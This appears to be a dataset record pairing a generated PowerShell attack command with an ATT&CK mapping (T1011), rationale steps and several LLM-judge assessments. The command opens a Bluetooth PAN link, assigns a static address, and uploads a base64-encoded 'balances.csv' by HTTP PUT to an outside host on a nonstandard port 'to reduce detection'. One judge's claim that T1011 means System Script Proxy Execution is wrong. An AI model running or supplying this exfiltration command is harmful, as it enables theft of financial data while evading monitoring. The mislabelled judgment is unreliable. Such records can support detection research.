command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 10.223.93.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Documents\balances.csv')); $ProgressPreference='SilentlyContinue'; Invoke-RestMethod -Uri 'http://10.223.93.1:52901/api/upload' -Method Put -Body $body -Headers @{ 'X-From'='btpan' } | Out-Null
explanation: Uses HTTP PUT to a custom port over a Bluetooth PAN-isolated subnet to exfiltrate base64 data, aligning with exfiltration over another network medium (T1011).
rationale_steps: Establish Bluetooth PAN connectivity using a Bluetooth manipulation tool.
Assign a static /30 address to the Bluetooth interface with netsh.
Send base64 data using HTTP on a nonstandard port to reduce detection.
Destination IP is only reachable over Bluetooth, forcing that medium.

llm_judgments.syntactic_justification: The PowerShell line is well-formed with balanced quotes/parentheses, proper separators, and valid pipelines and hashtable syntax.
llm_judgments.semantic_justification: It plausibly exfiltrates data over a Bluetooth PAN via HTTP PUT, but relies on BluetoothCL supporting the specified connect syntax and likely requires admin rights/correct netsh parameters for the static IP configuration.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper PowerShell syntax including balanced quotes, parentheses, and braces, correct command separators, valid flag formats, and proper variable usage.
llm_judgments.semantic_justification: The command fully implements the T1011 technique by establishing a Bluetooth PAN connection, configuring a network interface, converting a file to base64, and exfiltrating it via HTTP PUT to a remote endpoint over an alternative network medium.

llm_judgments.syntactic_justification: The command is perfectly well-formed PowerShell, using correct syntax for variable assignment, cmdlet execution, external program invocation, and parameter passing.
llm_judgments.semantic_justification: While the command performs exfiltration, it does not achieve the claimed intent of aligning with MITRE ATT&CK T1011 (System Script Proxy Execution), as it directly executes binaries and PowerShell cmdlets without abusing legitimate system scripts as proxies.
